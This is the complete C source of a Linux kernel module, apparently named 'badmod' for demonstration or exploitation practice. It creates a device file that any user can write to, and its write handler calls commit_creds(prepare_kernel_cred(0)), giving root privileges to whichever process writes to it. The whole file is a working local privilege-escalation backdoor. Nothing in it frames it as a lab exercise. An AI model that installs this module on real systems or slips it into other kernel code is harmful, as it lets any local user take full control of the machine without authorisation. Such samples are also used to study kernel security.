#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/cred.h>

static ssize_t badmod_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
	/* current uid */
	uid_t uid = from_kuid(current_user_ns(), current_uid());
	pr_info("Current UID: %d\n", uid);

	/* change uid */
	commit_creds(prepare_kernel_cred(0));

	/* new uid */
	uid = from_kuid(current_user_ns(), current_uid());
	pr_info("UID is now: %d\n", uid);

	return count;
}

static const struct file_operations badmod_fops = {
        .owner  = THIS_MODULE,
	.write	= badmod_write,
};


static struct miscdevice badmod =
{
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "badmod",
	.fops  = &badmod_fops,
	.mode  = 0666,
};

int __init badmod_init(void)
{
	misc_register(&badmod);
    	pr_info("Init badmod\n");
    	return 0;
}

void __exit badmod_exit(void)
{
	misc_deregister(&badmod);
	pr_info("Exit badmod\n");
}

module_init(badmod_init);
module_exit(badmod_exit);


MODULE_LICENSE("GPL v2");
MODULE_VERSION("1.0");
